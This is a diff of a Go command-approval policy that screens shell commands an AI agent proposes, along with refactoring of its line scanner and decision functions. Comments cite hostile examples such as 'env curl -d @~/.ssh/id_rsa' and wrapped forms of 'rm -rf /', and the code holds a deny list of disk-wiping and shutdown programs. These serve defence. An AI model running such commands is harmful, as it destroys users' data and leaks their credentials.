@@ -31,6 +31,13 @@ import (
 	"github.com/madkoding/motita/internal/semantic"
 )
 
+// Literals used more than once in this file.
+const (
+	categoryExternalEffect = "external-effect"
+	worksInFormat          = "works in (%s)"
+	tsNode                 = "ts-node"
+)
+
 // Verdict is what may be done with one command.
 type Verdict int
 
@@ -114,6 +121,22 @@ func (m Mode) DecisionFor(command string, args []string, dir string) Decision {
 	for strings.ContainsRune(command, '=') && len(args) > 0 && !strings.HasPrefix(command, "/") {
 		command, args = args[0], args[1:]
 	}
+	// A wrapper (`env`, `command`, `nice`, `timeout`…) is judged by the program it runs: every
+	// rule below reads the program's name and arguments, and `env curl -d @~/.ssh/id_rsa …`
+	// judged as `env` was a reader that ran in silence. A wrapper whose options hide what runs
+	// is not classified at all.
+	inner, innerArgs, why := readonly.Unwrap(command, args)
+	if why != "" {
+		return m.unclassified(why, "wrapper-unreadable")
+	}
+	if len(innerArgs) != len(args) {
+		command, args = inner, innerArgs
+		// The floor scan of the line knows some wrappers and not others (`timeout 5s rm -rf /`
+		// names its program after a duration), so the unwrapped program meets the floor here too.
+		if d, hit := mandatory(baseName(command), args, dir); hit {
+			return d
+		}
+	}
 	kind, reason := readonly.Classify(command, args)
 	name := baseName(command)
 	// A task works in the directory it was given. Moving the command's directory elsewhere
@@ -149,45 +172,55 @@ func (m Mode) DecisionFor(command string, args []string, dir string) Decision {
 		// line and decide — but it is never run unreviewed.
 		return Decision{Ask, reason + ": a shell line has to be approved as a whole", "shell", false}
 	case readonly.KindWriter:
-		// The writers whose effect reaches OUTSIDE the machine are asked about before the
-		// path question, because they have no path to check: `git push`, `npm publish`,
-		// `systemctl restart` and `curl -X DELETE` do not name a file, and their effect is
-		// not undone by a backup.
-		if reachesOutside(name, args) {
-			return Decision{Ask, fmt.Sprintf("%q can reach outside this machine or change the system "+
-				"as a whole, which is not something a task should do unannounced", baseName(command)),
-				"external-effect", false}
-		}
-		if d, hit := writingForm(command, args, dir); hit {
-			return d
-		}
-		// A known local build tool before the unclassified rule: `make`, `go build`, `python3
-		// script.py`. Without this the default would ask about the ordinary work of a project,
-		// which is the policy that gets switched off.
-		if d, hit := localToolDecision(name, args, dir); hit {
-			return d
-		}
-		return m.unclassified(fmt.Sprintf("%q changes the system and its target could not be "+
-			"determined from the arguments", baseName(command)), "writer-unclassified")
+		return m.writerDecision(command, name, args, dir)
 	default:
-		if reachesOutside(name, args) {
-			return Decision{Ask, fmt.Sprintf("%q reaches outside this machine, and what it does there "+
-				"cannot be checked from the command line", baseName(command)), "external-effect", false}
-		}
-		// The same for the unknown branch: a binary whose name we do not know a verdict for
-		// may still be a build tool the project needs.
-		if d, hit := localToolDecision(name, args, dir); hit {
-			return d
-		}
-		// A program that lives INSIDE the workspace is the project's own — `./scripts/deploy.sh`,
-		// `./bin/mytool`. It is the same judgement the writers get: the work stays where the
-		// user pointed the agent. A path outside is not this branch's to allow.
-		if d, hit := projectLocalDecision(command, args, dir); hit {
-			return d
-		}
-		return m.unclassified(fmt.Sprintf("%q is not a command this program knows, so what it "+
-			"changes cannot be predicted", baseName(command)), "unclassified")
+		return m.unknownDecision(command, name, args, dir)
 	}
+}
+
+// writerDecision decides a command classified as a writer.
+func (m Mode) writerDecision(command, name string, args []string, dir string) Decision {
+	// The writers whose effect reaches OUTSIDE the machine are asked about before the
+	// path question, because they have no path to check: `git push`, `npm publish`,
+	// `systemctl restart` and `curl -X DELETE` do not name a file, and their effect is
+	// not undone by a backup.
+	if reachesOutside(name, args) {
+		return Decision{Ask, fmt.Sprintf("%q can reach outside this machine or change the system "+
+			"as a whole, which is not something a task should do unannounced", baseName(command)),
+			categoryExternalEffect, false}
+	}
+	if d, hit := writingForm(command, args, dir); hit {
+		return d
+	}
+	// A known local build tool before the unclassified rule: `make`, `go build`, `python3
+	// script.py`. Without this the default would ask about the ordinary work of a project,
+	// which is the policy that gets switched off.
+	if d, hit := localToolDecision(name, args, dir); hit {
+		return d
+	}
+	return m.unclassified(fmt.Sprintf("%q changes the system and its target could not be "+
+		"determined from the arguments", baseName(command)), "writer-unclassified")
+}
+
+// unknownDecision decides a command the classifier has no verdict for.
+func (m Mode) unknownDecision(command, name string, args []string, dir string) Decision {
+	if reachesOutside(name, args) {
+		return Decision{Ask, fmt.Sprintf("%q reaches outside this machine, and what it does there "+
+			"cannot be checked from the command line", baseName(command)), categoryExternalEffect, false}
+	}
+	// The same for the unknown branch: a binary whose name we do not know a verdict for
+	// may still be a build tool the project needs.
+	if d, hit := localToolDecision(name, args, dir); hit {
+		return d
+	}
+	// A program that lives INSIDE the workspace is the project's own — `./scripts/deploy.sh`,
+	// `./bin/mytool`. It is the same judgement the writers get: the work stays where the
+	// user pointed the agent. A path outside is not this branch's to allow.
+	if d, hit := projectLocalDecision(command, args, dir); hit {
+		return d
+	}
+	return m.unclassified(fmt.Sprintf("%q is not a command this program knows, so what it "+
+		"changes cannot be predicted", baseName(command)), "unclassified")
 }
 
 // commitMessageDecision refuses a `git commit` whose message is on the command line and is not a
@@ -213,14 +246,20 @@ func commitMessageDecision(name string, args []string) (Decision, bool) {
 	return Decision{}, false
 }
 
+// gitValueOptions are git's global options that take the next argument as their value.
+var gitValueOptions = map[string]bool{
+	"-C": true, "-c": true, "--git-dir": true, "--work-tree": true, "--namespace": true, "--exec-path": true,
+}
+
 // gitSubcommand splits git's arguments into its subcommand and what follows it, skipping the
 // global options before the subcommand, some of which take a value (`git -C dir commit`).
 func gitSubcommand(args []string) (sub string, rest []string) {
 	for i := 0; i < len(args); i++ {
 		switch a := args[i]; {
-		case a == "-C" || a == "-c" || a == "--git-dir" || a == "--work-tree" || a == "--namespace" || a == "--exec-path":
+		case gitValueOptions[a]:
 			i++
 		case strings.HasPrefix(a, "-"):
+			// A global option without a value: skipped.
 		default:
 			return a, args[i+1:]
 		}
@@ -237,7 +276,8 @@ func forgeDecision(name string, args []string) (Decision, bool) {
 		return Decision{}, false
 	}
 	if len(args) >= 3 && args[1] == "pr" && args[2] == "create" {
-		return Decision{Ask, "this opens a pull request on the git host, under the user's account", "external-effect", false}, true
+		return Decision{Ask, "this opens a pull request on the git host, under the user's account",
+			categoryExternalEffect, false}, true
 	}
 	return Decision{Allow, "this only reads from the git host", "reader", false}, true
 }
@@ -260,12 +300,18 @@ var shellBuiltins = map[string]bool{
 // install or do it themselves. It answers false for what it cannot judge: no way to look programs
 // up, a path, a shell builtin or an assignment.
 func (m Mode) missingTool(name string) (Decision, bool) {
-	if m.Have == nil || name == "" || shellBuiltins[name] || strings.ContainsAny(name, "/=$~") || m.Have(name) {
+	if m.Have == nil || unjudgeableTool(name) || m.Have(name) {
 		return Decision{}, false
 	}
 	return Decision{Ask, fmt.Sprintf("%q is not installed. Approve to let the agent install it with the "+
 		"system package manager or the project's own way, or install it yourself and run the "+
 		"command again", name), "tool-missing", false}, true
+}
+
+// unjudgeableTool reports a name that no PATH lookup can answer for: none at all, a shell
+// builtin, a path or an assignment.
+func unjudgeableTool(name string) bool {
+	return name == "" || shellBuiltins[name] || strings.ContainsAny(name, "/=$~")
 }
 
 // leavesWorkspace asks about a command that points itself at a directory outside dir: `cd` and
@@ -286,18 +332,25 @@ func leavesWorkspace(name string, args []string, dir string) (Decision, bool) {
 			target = operands[0]
 		}
 	case "git", "make":
-		for i, a := range args {
-			if a == "-C" && i+1 < len(args) {
-				target = args[i+1]
-				break
-			}
-		}
+		target = dashCTarget(args)
+	default:
+		// Any other program does not move its own directory.
 	}
 	if target == "" || (target != "-" && firstOutside([]string{target}, dir) == "") {
 		return Decision{}, false
 	}
 	return Decision{Ask, fmt.Sprintf("%q moves to %q, which is outside the directory this task "+
-		"works in (%s)", name, target, dir), "leaves-workspace", false}, true
+		worksInFormat, name, target, dir), "leaves-workspace", false}, true
+}
+
+// dashCTarget is the directory a `-C dir` option names, or "" when there is none.
+func dashCTarget(args []string) string {
+	for i, a := range args {
+		if a == "-C" && i+1 < len(args) {
+			return args[i+1]
+		}
+	}
+	return ""
 }
 
 // projectLocalDecision allows a program that lives inside the workspace and is passed explicit
@@ -315,7 +368,7 @@ func projectLocalDecision(command string, args []string, dir string) (Decision, 
 	targets := rmTargets(args)
 	if outside := firstOutside(targets, dir); outside != "" {
 		return Decision{Ask, fmt.Sprintf("%q takes %q, which is outside the directory this task "+
-			"works in (%s)", baseName(command), outside, dir), "project-script-arg-outside", false}, true
+			worksInFormat, baseName(command), outside, dir), "project-script-arg-outside", false}, true
 	}
 	if !isInsideWorkspace(command, dir) {
 		return Decision{}, false
@@ -367,7 +420,7 @@ var localTools = map[string]bool{
 	"gofmt": true, "golangci-lint": true, "shfmt": true, "shellcheck": true,
 	// interpreters: the script's own location is checked below
 	"python": true, "python3": true, "node": true, "ruby": true, "perl": true, "php": true,
-	"deno": true, "bun": true, "java": true, "ts-node": true,
+	"deno": true, "bun": true, "java": true, tsNode: true,
 	// project tooling
 	"west": true, "platformio": true, "idf.py": true, "poetry": true, "uv": true,
 	// The tools that are also in externalPrograms, whose LOCAL VERBS are ordinary work.
@@ -384,7 +437,7 @@ var localTools = map[string]bool{
 // program. That file is what the policy can look at, which is why these get the extra check.
 var interpreters = map[string]bool{
 	"python": true, "python3": true, "node": true, "ruby": true, "perl": true, "php": true,
-	"deno": true, "bun": true, "ts-node": true,
+	"deno": true, "bun": true, tsNode: true,
 }
 
 // inlineProgramFlags names, PER INTERPRETER, the flags that carry the PROGRAM ITSELF in the
@@ -406,7 +459,7 @@ var inlineProgramFlags = map[string]map[string]bool{
 	"perl":    {"-e": true, "-E": true, "-pe": true, "-ne": true, "-ple": true},
 	"ruby":    {"-e": true},
 	"php":     {"-r": true},
-	"ts-node": {"-e": true},
+	tsNode:    {"-e": true},
 }
 
 // localToolDecision answers the programs whose ordinary use is local work.
@@ -520,10 +573,11 @@ var subcommandScoped = map[string]func(sub string) bool{
 			"add", "commit", "checkout", "switch", "restore", "stash", "merge", "rebase",
 			"init", "clone", "worktree", "rm", "mv":
 			return false
+		default:
+			// push, reset, clean, filter-branch, gc, submodule … all reach somewhere the user
+			// cannot see from here.
+			return true
 		}
-		// push, reset, clean, filter-branch, gc, submodule … all reach somewhere the user
-		// cannot see from here.
-		return true
 	},
 	"hg":  func(sub string) bool { return sub != "status" && sub != "log" && sub != "diff" },
 	"svn": func(sub string) bool { return sub != "status" && sub != "log" && sub != "diff" },
@@ -533,22 +587,25 @@ var subcommandScoped = map[string]func(sub string) bool{
 		switch sub {
 		case "test", "build", "vet", "fmt", "list", "doc", "version", "env", "run", "generate":
 			return false
+		default:
+			return true
 		}
-		return true
 	},
 	"npm": func(sub string) bool {
 		switch sub {
 		case "test", "run", "run-script", "exec", "ls", "list", "view", "outdated", "audit":
 			return false
+		default:
+			return true
 		}
-		return true
 	},
 	"cargo": func(sub string) bool {
 		switch sub {
 		case "test", "build", "check", "clippy", "fmt", "run", "doc", "tree":
 			return false
+		default:
+			return true
 		}
-		return true
 	},
 	"pip":  func(sub string) bool { return sub != "list" && sub != "show" && sub != "freeze" },
 	"pip3": func(sub string) bool { return sub != "list" && sub != "show" && sub != "freeze" },
@@ -556,8 +613,9 @@ var subcommandScoped = map[string]func(sub string) bool{
 		switch sub {
 		case "test", "run", "list", "why", "outdated":
 			return false
+		default:
+			return true
 		}
-		return true
 	},
 
 	// Containers: the local inspection verbs are harmless, anything that runs or ships is not.
@@ -565,15 +623,17 @@ var subcommandScoped = map[string]func(sub string) bool{
 		switch sub {
 		case "ps", "images", "inspect", "logs", "version", "info":
 			return false
+		default:
+			return true
 		}
-		return true
 	},
 	"kubectl": func(sub string) bool {
 		switch sub {
 		case "get", "describe", "logs", "version", "explain":
 			return false
+		default:
+			return true
 		}
-		return true
 	},
 
 	// Process control: inspecting is one thing, killing is another.
@@ -683,29 +743,12 @@ func (m Mode) DecideLine(line, dir string) Decision {
 		return m.Relaxing(d)
 	}
 	for _, seg := range lineSegments(main) {
-		var d Decision
-		if seg.redirect {
-			d = m.redirectTarget(seg, dir)
-		} else {
-			words, syntax := stripShellKeyword(seg.words)
-			if syntax {
-				// `for f in a b`, `done`, `fi`: the control syntax of a loop or a branch runs
-				// nothing by itself. What it wraps is a segment of its own and is judged as one.
-				continue
-			}
-			name, args, err := readonly.SplitCommand(strings.Join(words, " "))
-			if err != nil {
-				// A segment that still cannot be read: an unclosed quote, a trailing
-				// backslash. It is offered whole, or refused in strict mode, with the
-				// tokeniser's own reason.
-				return m.unclassified(fmt.Sprintf("%s: this part of the line cannot be read as one "+
-					"program with arguments", err), "line-unreadable")
-			}
-			if missing, hit := m.missingTool(name); hit {
-				d = missing
-			} else {
-				d = m.Decide(name, args, dir)
-			}
+		d, skip, final := m.segmentDecision(seg, dir)
+		if final {
+			return d
+		}
+		if skip {
+			continue
 		}
 		if !found {
 			worst, found = d, true
@@ -717,6 +760,32 @@ func (m Mode) DecideLine(line, dir string) Decision {
 		return Decision{Deny, "there is no command to run", "missing", false}
 	}
 	return m.Relaxing(worst)
+}
+
+// segmentDecision decides one segment of a line. skip reports a segment that runs nothing, and
+// final a verdict that decides the whole line on its own.
+func (m Mode) segmentDecision(seg lineSegment, dir string) (d Decision, skip, final bool) {
+	if seg.redirect {
+		return m.redirectTarget(seg, dir), false, false
+	}
+	words, syntax := stripShellKeyword(seg.words)
+	if syntax {
+		// `for f in a b`, `done`, `fi`: the control syntax of a loop or a branch runs
+		// nothing by itself. What it wraps is a segment of its own and is judged as one.
+		return Decision{}, true, false
+	}
+	name, args, err := readonly.SplitCommand(strings.Join(words, " "))
+	if err != nil {
+		// A segment that still cannot be read: an unclosed quote, a trailing
+		// backslash. It is offered whole, or refused in strict mode, with the
+		// tokeniser's own reason.
+		return m.unclassified(fmt.Sprintf("%s: this part of the line cannot be read as one "+
+			"program with arguments", err), "line-unreadable"), false, true
+	}
+	if missing, hit := m.missingTool(name); hit {
+		return missing, false, false
+	}
+	return m.Decide(name, args, dir), false, false
 }
 
 // shellKeywords are the words that shape a compound command and are not programs. A loop such
@@ -794,16 +863,18 @@ func (m Mode) redirectTarget(seg lineSegment, dir string) Decision {
 			return Decision{Allow, fmt.Sprintf("output is discarded into %q", target), "line-redirect-devnull", false}
 		}
 		return Decision{
-			Verdict:   Deny,
-			Reason:    fmt.Sprintf("refused: writing to the device %q destroys its contents, and no setting turns this into an allowed action", target),
+			Verdict: Deny,
+			Reason: fmt.Sprintf("refused: writing to the device %q destroys its contents, "+
+				"and no setting turns this into an allowed action", target),
 			Rule:      "mandatory-device-write",
 			Mandatory: true,
 		}
 	}
 	if isRootWriteTarget(target) {
 		return Decision{
-			Verdict:   Deny,
-			Reason:    fmt.Sprintf("refused: writing to %q would overwrite a system file, and no setting turns this into an allowed action", target),
+			Verdict: Deny,
+			Reason: fmt.Sprintf("refused: writing to %q would overwrite a system file, "+
+				"and no setting turns this into an allowed action", target),
 			Rule:      "mandatory-system-write",
 			Mandatory: true,
 		}
@@ -812,7 +883,8 @@ func (m Mode) redirectTarget(seg lineSegment, dir string) Decision {
 		return Decision{Ask, fmt.Sprintf("the line writes to %q, which is outside the directory this "+
 			"task works in (%s)", outside, dir), "write-outside-workspace", false}
 	}
-	return Decision{Allow, fmt.Sprintf("the line writes inside the workspace (%s)", dir), "write-inside-workspace", false}
+	return Decision{Allow, fmt.Sprintf("the line writes inside the workspace (%s)", dir),
+		"write-inside-workspace", false}
 }
 
 // lineSegment is one piece of a command line: the words of one command, or the target of
@@ -844,118 +916,147 @@ type lineSegment struct {
 // acceptable is the caller's decision, and leaving that to the caller is what lets the same
 // line be refused in strict mode and asked about in the default one.
 func lineSegments(line string) []lineSegment {
-	var (
-		out       []lineSegment
-		words     []string
-		redirects []lineSegment
-		current   strings.Builder
-		quote     rune
-		escaped   bool
-		// op is the redirection being read, non-empty from its `>` until its target has
-		// been taken. An `&` reference (`2>&1`) closes it on the spot, because its
-		// destination is part of the operator and there is no file to come.
-		op string
-		// fdRef is true right after the `&` of `2>&1`: the descriptor that follows belongs to
-		// the redirection. Left in the stream, `npm ci 2>&1` reached the command as `npm ci 1`.
-		fdRef bool
-	)
-
-	flushWord := func() {
-		if current.Len() > 0 {
-			words = append(words, current.String())
-			current.Reset()
-		}
-	}
-	// takeTarget closes a redirection with the word being read, which may be empty when the
-	// operator had no destination (`ls >` alone).
-	takeTarget := func() {
-		redirects = append(redirects, lineSegment{redirect: true, op: op, words: []string{current.String()}})
-		current.Reset()
-		op = ""
-	}
-	// flushCommand emits the command read so far, followed by the redirections that were
-	// interleaved with it. A command with no words and no redirections emits nothing.
-	flushCommand := func(sep string) {
-		flushWord()
-		if len(words) > 0 {
-			out = append(out, lineSegment{words: words, op: sep})
-			words = nil
-		}
-		if len(redirects) > 0 {
-			out = append(out, redirects...)
-			redirects = nil
-		}
-	}
-
+	var s segmentScanner
 	for _, r := range line {
-		if fdRef {
-			fdRef = false
-			if (r >= '0' && r <= '9') || r == '-' {
-				continue
-			}
-		}
-		switch {
-		case escaped:
-			current.WriteRune(r)
-			escaped = false
-		case r == '\\' && quote != '\'':
-			escaped = true
-		case quote != 0:
-			// The quote characters are KEPT in the word. The segment is re-read as a
-			// command afterwards, and `grep -n "two words" f` only produces one argument if
-			// the quoting survives the round trip: stripping it here would hand the
-			// tokeniser five words and change what the program is given.
-			current.WriteRune(r)
-			if r == quote {
-				quote = 0
-			}
-		case r == '\'' || r == '"':
-			current.WriteRune(r)
-			quote = r
-		case r == '>':
-			if isDigits(current.String()) {
-				// A file descriptor on the left of the operator (`2>`, `1>>`): it belongs
-				// to the redirection, not to the command's arguments.
-				op += current.String()
-				current.Reset()
-			} else {
-				flushWord()
-			}
-			op += string(r)
-		case r == '<':
-			flushWord()
-			op += string(r)
-		case r == '&' && op != "":
-			// `2>&1`, `>&2`, `>&-`: the destination is part of the operator, so the
-			// redirection is complete and takes no file.
-			flushWord()
-			redirects = append(redirects, lineSegment{redirect: true, op: op + "&"})
-			op = ""
-			fdRef = true
-		case r == ' ' || r == '	':
-			if op != "" {
-				// A word while a redirection is open is its target. A blank before any
-				// word is just spacing.
-				if current.Len() > 0 {
-					takeTarget()
-				}
-				continue
-			}
-			flushWord()
-		case isBreakRune(r):
-			if op != "" {
-				takeTarget()
-			}
-			flushCommand(string(r))
-		default:
-			current.WriteRune(r)
+		s.feed(r)
+	}
+	if s.op != "" {
+		s.takeTarget()
+	}
+	s.flushCommand("")
+	return s.out
+}
+
+// segmentScanner is the state of lineSegments while it reads a line.
+type segmentScanner struct {
+	out       []lineSegment
+	words     []string
+	redirects []lineSegment
+	current   strings.Builder
+	quote     rune
+	escaped   bool
+	// op is the redirection being read, non-empty from its `>` until its target has
+	// been taken. An `&` reference (`2>&1`) closes it on the spot, because its
+	// destination is part of the operator and there is no file to come.
+	op string
+	// fdRef is true right after the `&` of `2>&1`: the descriptor that follows belongs to
+	// the redirection. Left in the stream, `npm ci 2>&1` reached the command as `npm ci 1`.
+	fdRef bool
+}
+
+// feed reads one character of the line.
+func (s *segmentScanner) feed(r rune) {
+	if s.fdRef {
+		s.fdRef = false
+		if (r >= '0' && r <= '9') || r == '-' {
+			return
 		}
 	}
-	if op != "" {
-		takeTarget()
+	switch {
+	case s.escaped:
+		s.current.WriteRune(r)
+		s.escaped = false
+	case r == '\\' && s.quote != '\'':
+		s.escaped = true
+	case s.quote != 0:
+		s.quoted(r)
+	case r == '\'' || r == '"':
+		s.current.WriteRune(r)
+		s.quote = r
+	case r == '>':
+		s.redirectOutput(r)
+	case r == '<':
+		s.flushWord()
+		s.op += string(r)
+	case r == '&' && s.op != "":
+		s.descriptorReference()
+	case r == ' ' || r == '\t':
+		s.blank()
+	case isBreakRune(r):
+		if s.op != "" {
+			s.takeTarget()
+		}
+		s.flushCommand(string(r))
+	default:
+		s.current.WriteRune(r)
 	}
-	flushCommand("")
-	return out
+}
+
+// quoted reads a character inside quotes.
+//
+// The quote characters are KEPT in the word. The segment is re-read as a command afterwards, and
+// `grep -n "two words" f` only produces one argument if the quoting survives the round trip:
+// stripping it here would hand the tokeniser five words and change what the program is given.
+func (s *segmentScanner) quoted(r rune) {
+	s.current.WriteRune(r)
+	if r == s.quote {
+		s.quote = 0
+	}
+}
+
+// redirectOutput reads a `>`.
+func (s *segmentScanner) redirectOutput(r rune) {
+	if isDigits(s.current.String()) {
+		// A file descriptor on the left of the operator (`2>`, `1>>`): it belongs
+		// to the redirection, not to the command's arguments.
+		s.op += s.current.String()
+		s.current.Reset()
+	} else {
+		s.flushWord()
+	}
+	s.op += string(r)
+}
+
+// descriptorReference reads the `&` of `2>&1`, `>&2`, `>&-`: the destination is part of the
+// operator, so the redirection is complete and takes no file.
+func (s *segmentScanner) descriptorReference() {
+	s.flushWord()
+	s.redirects = append(s.redirects, lineSegment{redirect: true, op: s.op + "&"})
+	s.op = ""
+	s.fdRef = true
+}
+
+// blank reads a space or a tab.
+func (s *segmentScanner) blank() {
+	if s.op != "" {
+		// A word while a redirection is open is its target. A blank before any
+		// word is just spacing.
+		if s.current.Len() > 0 {
+			s.takeTarget()
+		}
+		return
+	}
+	s.flushWord()
+}
+
+// flushWord ends the word being read.
+func (s *segmentScanner) flushWord() {
+	if s.current.Len() > 0 {
+		s.words = append(s.words, s.current.String())
+		s.current.Reset()
+	}
+}
+
+// takeTarget closes a redirection with the word being read, which may be empty when the
+// operator had no destination (`ls >` alone).
+func (s *segmentScanner) takeTarget() {
+	s.redirects = append(s.redirects, lineSegment{redirect: true, op: s.op, words: []string{s.current.String()}})
+	s.current.Reset()
+	s.op = ""
+}
+
+// flushCommand emits the command read so far, followed by the redirections that were
+// interleaved with it. A command with no words and no redirections emits nothing.
+func (s *segmentScanner) flushCommand(sep string) {
+	s.flushWord()
+	if len(s.words) > 0 {
+		s.out = append(s.out, lineSegment{words: s.words, op: sep})
+		s.words = nil
+	}
+	if len(s.redirects) > 0 {
+		s.out = append(s.out, s.redirects...)
+		s.redirects = nil
+	}
 }
 
 // unquote strips one surrounding pair of quotes, which is what a path written inside quotes
@@ -991,8 +1092,9 @@ func isBreakRune(r rune) bool {
 	switch r {
 	case '|', '&', ';', '\n', '\r', '(', ')', '`', '{', '}':
 		return true
+	default:
+		return false
 	}
-	return false
 }
 
 // Relaxing is what the mode does to a verdict, in one place.
@@ -1019,972 +1121,4 @@ func (m Mode) Decide(command string, args []string, dir string) Decision {
 
 func baseName(command string) string {
 	return strings.ToLower(filepath.Base(strings.TrimSpace(command)))
-}
-
-// ---------------------------------------------------------------------------
-// The mandatory floor
-// ---------------------------------------------------------------------------
-
-// MandatoryInLine refuses the floor commands found ANYWHERE in a line, including inside a
-// quoted payload handed to a shell.
-//
-// It exists because the per-program check cannot see a line the tokeniser refuses and
-// because a shell is the ordinary way to reach one: `sh -c 'rm -rf /'` never reaches the
-// classifier as `rm`, and a rule that only fires on a well-formed command is a rule a
-// malformed one walks past.
-//
-// It is a scan and not a parser, which is a deliberate trade. It looks for a floor program
-// in COMMAND POSITION: the first token of a segment, after a wrapper like `sudo` or `env`,
-// after `xargs`, after `find -exec`, or as the payload of `<shell> -c`. Tokens in argument
-// position are ignored, so `echo "rm -rf /"` — a line that merely mentions the command — is
-// not refused.
-//
-// False negatives are possible and are covered elsewhere: a floor command reached through a
-// program this scan does not know still reaches the classifier as that program, which
-// either refuses it (the writers list) or asks about it (unclassified). False positives are
-// possible too, and they are the safe direction: the floor only ever refuses.
-func MandatoryInLine(line, dir string) (Decision, bool) {
-	return scanLine(line, dir)
-}
-
-// floorPrograms are the programs the floor knows. It is the membership test for the scan,
-// and it must name everything mandatory() decides — see the test that holds the two
-// together.
-//
-// `mv`, `cp`, `ln` and `install` are here for the same reason `rm` is: they reach the same
-// tree from a different direction. Leaving them out would make the floor depend on which
-// verb the model happened to choose, which is exactly the kind of hole a floor cannot have.
-var floorPrograms = map[string]bool{
-	"rm": true, "dd": true, "wipefs": true, "blkdiscard": true, "shred": true,
-	"mv": true, "cp": true, "ln": true, "install": true,
-	"mkfs": true, "mkfs.ext2": true, "mkfs.ext3": true, "mkfs.ext4": true,
-	"mkfs.xfs": true, "mkfs.btrfs": true, "mkfs.vfat": true,
-	"fdisk": true, "sfdisk": true, "cfdisk": true, "parted": true, "gdisk": true, "sgdisk": true,
-	"shutdown": true, "reboot": true, "halt": true, "poweroff": true, "init": true,
-}
-
-// commandWrappers run another command: the command position follows them, so the scan keeps
-// expecting a program after one and skips their own flags and `VAR=value` assignments.
-var commandWrappers = map[string]bool{
-	"sudo": true, "doas": true, "env": true, "nohup": true, "command": true,
-	"nice": true, "ionice": true, "time": true, "stdbuf": true, "setsid": true,
-}
-
-// nestedIntroducers open a command position in the MIDDLE of a segment, which is how xargs
-// and find's -exec reach a program.
-var nestedIntroducers = map[string]bool{
-	"xargs": true, "-exec": true, "-execdir": true, "-ok": true, "-okdir": true,
-}
-
-func scanLine(line, dir string) (Decision, bool) {
-	for _, segment := range segments(line) {
-		if d, hit := scanSegment(segment, dir, false); hit {
-			return d, true
-		}
-	}
-	return Decision{}, false
-}
-
-// segments splits a line wherever a shell would start a new command: a separator, a pipe, a
-// redirection, a substitution, or a quoted run inside one of those.
-func segments(line string) [][]string {
-	var out [][]string
-	var current []string
-	flush := func() {
-		if len(current) > 0 {
-			out = append(out, current)
-			current = nil
-		}
-	}
-	for _, token := range lineTokens(line) {
-		if isSeparatorToken(token) {
-			flush()
-			continue
-		}
-		current = append(current, token)
-	}
-	flush()
-	return out
-}
-
-// lineTokens splits a line into words, KEEPING the characters that separate commands.
-//
-// Ignoring quotes is deliberate: the payload of `sh -c 'rm -rf /'` is one shell word, and a
-// quote-aware tokeniser would hand the scan the single token `rm -rf /` whose program name
-// is none of the floor's. Keeping the separators is what lets the scan see that a line has a
-// second command — dropping them, as a plain field split does, makes `ls; rm -rf /` look
-// like one command called `ls` with five arguments.
-func lineTokens(line string) []string {
-	fields := strings.FieldsFunc(line, func(r rune) bool {
-		return r == ' ' || r == '	' || r == '\n' || r == '\r'
-	})
-	out := make([]string, 0, len(fields))
-	for _, f := range fields {
-		// A field can still hold separators glued to words (`ls;rm`), so it is split again
-		// on them, with the separator emitted as its own token.
-		var current strings.Builder
-		for _, r := range f {
-			if isSeparatorRune(r) {
-				if current.Len() > 0 {
-					out = append(out, strings.Trim(current.String(), `"'`))
-					current.Reset()
-				}
-				out = append(out, string(r))
-				continue
-			}
-			current.WriteRune(r)
-		}
-		if current.Len() > 0 {
-			if w := strings.Trim(current.String(), `"'`); w != "" {
-				out = append(out, w)
-			}
-		}
-	}
-	return out
-}
-
-func isSeparatorRune(r rune) bool {
-	switch r {
-	case ';', '|', '&', '(', ')', '`', '{', '}':
-		return true
-	}
-	return false
-}
-
-// isSeparatorToken reports whether a token is a command separator.
-//
-// The separators arrive as their own token now, so this is a membership test rather than a
-// search inside a word. The redirection operators are here too: `> file` ends the command
-// that wrote to it, and the scan must not run its program name past it.
-func isSeparatorToken(token string) bool {
-	switch token {
-	case ";", "|", "&", "(", ")", "`", "{", "}", "&&", "||", "\n", "\r",
-		">", ">>", "<", "<<", "<>", ">&", "<&":
-		return true
-	}
-	return false
-}
-
-// scanSegment walks one segment and reports a floor command in command position.
-//
-// fromNested is true when the program about to be read was named by an introducer — `xargs`
-// or `find -exec` — which is what makes the difference between `rm -rf` typed at a prompt
-// (which prints a usage error) and `rm -rf` fed by xargs (which deletes whatever it is
-// handed). Only the second one is a floor command, and only the introducer says which it is.
-func scanSegment(tokens []string, dir string, fromNested bool) (Decision, bool) {
-	expectCommand := true
-	// wrapper is the wrapper program in effect, and valueNext says the token before this
-	// one was one of that wrapper's options which takes a value.
-	//
-	// It is tracked because skipping only the flags is not enough: `sudo -u root rm -rf /`
-	// names its program AFTER the user it switches to, and a scan that treated `root` as
-	// the program would walk straight past the floor. The operands of a wrapper are its
-	// arguments, never the command the line runs.
-	wrapper, valueNext := "", false
-	for i := 0; i < len(tokens); i++ {
-		token := tokens[i]
-		name := baseName(token)
-
-		if !expectCommand {
-			// An argument: only a nested introducer moves the command position.
-			if nestedIntroducers[name] {
-				return scanSegment(tokens[i+1:], dir, true)
-			}
-			continue
-		}
-
-		// A nested introducer opens a command position wherever it appears, which is how
-		// `xargs rm -rf` and `find . -exec rm {} ;` name their program.
-		if nestedIntroducers[name] {
-			return scanSegment(tokens[i+1:], dir, true)
-		}
-
-		// The value of a wrapper's own option — the `root` in `sudo -u root`, the `10` in
-		// `nice -n 10`. It is a value, not the program.
-		if valueNext {
-			valueNext = false
-			continue
-		}
-		if wrapperValueFlags[wrapper][token] {
-			valueNext = true
-			continue
-		}
-		// Flags and `VAR=value` assignments belong to the wrapper that preceded them.
-		if strings.HasPrefix(token, "-") && token != "-" {
-			continue
-		}
-		if strings.ContainsRune(token, '=') && !floorPrograms[name] {
-			continue
-		}
-		if isDigits(token) {
-			continue
-		}
-
-		if floorPrograms[name] {
-			args := commandArgs(tokens[i+1:])
-			// The operands in the LINE are what matters here, not the ones inside a
-			// wrapper: `sh -c "rm -rf"` is caught by the shell branch below, but
-			// `xargs rm -rf` reaches this point with `rm`'s own operands empty and its
-			// target supplied at run time.
-			if d, hit := mandatory(name, lineArgs(tokens, i+1), dir); hit {
-				return d, true
-			}
-			// A destructive verb whose operands come from somewhere else: `xargs rm -rf`
-			// names no target because xargs supplies it, and that is precisely the shape
-			// that removes the wrong tree.
-			if fromNested && destructiveVerb(name, args) {
-				return mandatoryDeny(name, fmt.Sprintf("`%s` is given its target by the introducer "+
-					"that names it, so what it destroys is not written anywhere in this line", token))
-			}
-			expectCommand = false
-			continue
-		}
-
-		// A shell with -c takes the rest of the segment as a line of its own, which is
-		// then scanned from its own command position.
-		if isShellName(name) && i+1 < len(tokens) && tokens[i+1] == "-c" {
